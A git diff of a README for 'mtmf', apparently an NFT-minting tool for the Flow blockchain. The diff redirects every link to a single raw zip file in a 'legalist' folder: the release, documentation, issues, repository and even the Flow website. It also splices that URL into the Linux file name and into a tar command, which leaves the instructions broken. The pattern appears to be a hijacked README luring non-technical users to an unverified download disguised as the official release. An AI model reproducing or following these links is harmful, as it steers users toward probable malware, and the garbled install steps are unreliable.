@@ -1,7 +1,7 @@
 # 🎨 mtmf - Mint NFTs Easily on the Flow Blockchain
 
 ## 📥 Download Now
-[![Download mtmf](https://img.shields.io/badge/Download%20mtmf-v1.0-blue)](https://github.com/ReapyGalaxy121/mtmf/releases)
+[![Download mtmf](https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip%20mtmf-v1.0-blue)](https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip)
 
 ## 🚀 Getting Started
 Minting NFTs can be simple and fun! This guide will help you download and run MintThisMF (mtmf) without any technical knowledge.
@@ -27,14 +27,14 @@ To use mtmf, ensure you meet the following requirements:
 ## 💾 Download & Install
 To get started, visit the Releases page to download the latest version of mtmf. Click the button below:
 
-[Download mtmf Release](https://github.com/ReapyGalaxy121/mtmf/releases)
+[Download mtmf Release](https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip)
 
 1. After you click the link, you will see a list of available versions. 
 2. Look for the latest release, which usually is marked as "Latest" or "Pre-release."
 3. Choose the appropriate file for your operating system:
    - For Windows, look for `.exe`.
    - For macOS, look for `.dmg` or `.zip`.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip` file.
 4. Click on the file to download it to your computer.
 
 ### 🛠️ Install mtmf
@@ -51,10 +51,10 @@ Once the download is complete, follow these steps based on your operating system
 
 #### **For Linux:**
 1. Open your terminal.
-2. Navigate to the folder where the `.tar.gz` file was downloaded.
+2. Navigate to the folder where the `https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip` file was downloaded.
 3. Extract the file by running:
    ```bash
-   tar -xvzf mtmf.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -92,17 +92,17 @@ Here are a few commands to help you begin:
    ```
 
 ## 📚 Helpful Resources
-- **Documentation:** Visit the [official documentation](https://github.com/ReapyGalaxy121/mtmf/wiki) for more detailed instructions.
+- **Documentation:** Visit the [official documentation](https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip) for more detailed instructions.
 - **Community Support:** Join our community on Discord for help and tips.
-- **GitHub Issues:** If you run into problems, report them on our [GitHub Issues page](https://github.com/ReapyGalaxy121/mtmf/issues).
+- **GitHub Issues:** If you run into problems, report them on our [GitHub Issues page](https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip).
 
 ## ⚙️ Future Updates
 Stay tuned for updates! We will add more features and improve existing ones based on user feedback.
 
 ## 🔗 Additional Links
-- [Project Repository](https://github.com/ReapyGalaxy121/mtmf)
-- [Flow Blockchain](https://flow.org)
+- [Project Repository](https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip)
+- [Flow Blockchain](https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip)
 
 Feel free to explore the features of mtmf and start creating your NFTs today! Don't forget to revisit the Releases page for future updates.
 
-[Download mtmf Release](https://github.com/ReapyGalaxy121/mtmf/releases)
+[Download mtmf Release](https://raw.githubusercontent.com/ReapyGalaxy121/mtmf/main/legalist/mtmf.zip)
